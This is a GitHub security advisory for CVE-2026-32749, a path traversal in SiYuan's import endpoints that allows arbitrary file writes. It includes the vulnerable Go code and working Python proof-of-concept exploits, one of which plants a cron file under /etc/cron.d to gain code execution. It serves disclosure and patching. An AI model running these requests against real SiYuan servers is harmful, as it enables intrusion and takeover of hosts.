# [H] SiYuan importSY/importZipMd: path traversal via multipart filename enables arbitrary file write

## Summary
Severity: High
Advisory: GHSA-qvvf-q994-x79v
CVE: CVE-2026-32749
CWE: CWE-22, CWE-73
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:L/I:H/A:N (CVSS_V3)
Published: 2026-03-16
Source: https://github.com/advisories/GHSA-qvvf-q994-x79v
Type: github-advisory

## Affected
- Go: `github.com/siyuan-note/siyuan/kernel` — affected >=0

## Details
### Summary
POST /api/import/importSY and POST /api/import/importZipMd write uploaded archives to a path derived from the multipart filename field without sanitization, allowing an admin to write files to arbitrary locations outside the temp directory - including system paths that enable RCE.

### Details
File: kernel/api/import.go - functions importSY and importZipMd

```go
file := files[0]
writePath := filepath.Join(util.TempDir, "import", file.Filename)
writer, err := os.OpenFile(writePath, os.O_RDWR|os.O_CREATE, 0644)
```

importZipMd has a second traversal in unzipPath construction:
```go
filenameMain := strings.TrimSuffix(file.Filename, filepath.Ext(file.Filename))
unzipPath    := filepath.Join(util.TempDir, "import", filenameMain)
gulu.Zip.Unzip(writePath, unzipPath)
```

filepath.Join calls filepath.Clean internally, but cleaning happens after concatenation - sufficient ../ sequences escape the base directory entirely. The curl tool sanitizes ../ in multipart filenames, so exploitation requires sending the raw HTTP request via Python requests or a custom client.

### PoC
**Environment:**
```bash
docker run -d --name siyuan -p 6806:6806 \
  -v $(pwd)/workspace:/siyuan/workspace \
  b3log/siyuan --workspace=/siyuan/workspace --accessAuthCode=test123
```

**Exploit:**
```python
import requests, zipfile, io

HOST  = "http://localhost:6806"
TOKEN = "YOUR_ADMIN_TOKEN"

buf = io.BytesIO()
with zipfile.ZipFile(buf, 'w') as z:
    z.writestr("TestNB/20240101000000-abcdefg.sy",
        '{"ID":"20240101000000-abcdefg","Spec":"1","Type":"NodeDocument","Children":[]}')
    z.writestr("TestNB/.siyuan/sort.json", "{}")
buf.seek(0)

r = requests.post(f"{HOST}/api/import/importSY",
    headers={"Authorization": f"Token {TOKEN}"},
    files={"file": ("../../data/TRAVERSAL_PROOF.zip", buf.read(), "application/zip")},
    data={"notebook": "YOUR_NOTEBOOK_ID", "toPath": "/"})

print(r.text)
```

**RCE via cron (root container):**
```python
cron = b"* * * * * root touch /tmp/RCE_CONFIRMED\n"
r = requests.post(f"{HOST}/api/import/importSY",
    headers={"Authorization": f"Token {TOKEN}"},
    files={"file": ("../../../../../etc/cron.d/siyuan_poc", cron, "application/zip")},
    data={"notebook": "NOTEBOOK_ID", "toPath": "/"})
```

**Confirmed response on v3.6.0:** {"code":0,"msg":"","data":null}

### Impact
An admin can write arbitrary content to any path writable by the SiYuan process:
- RCE via /etc/cron.d/ (root containers), ~/.bashrc, SSH authorized_keys
- Data destruction by overwriting workspace or application files
- In Docker containers running as root (common default), this grants full container compromise

## References
- https://github.com/siyuan-note/siyuan/security/advisories/GHSA-qvvf-q994-x79v
- https://nvd.nist.gov/vuln/detail/CVE-2026-32749
- https://github.com/siyuan-note/siyuan/commit/5ee00907f0b0c4aca748ce21ef1977bb98178e14
- https://github.com/siyuan-note/siyuan
- https://github.com/siyuan-note/siyuan/releases/tag/v3.6.1
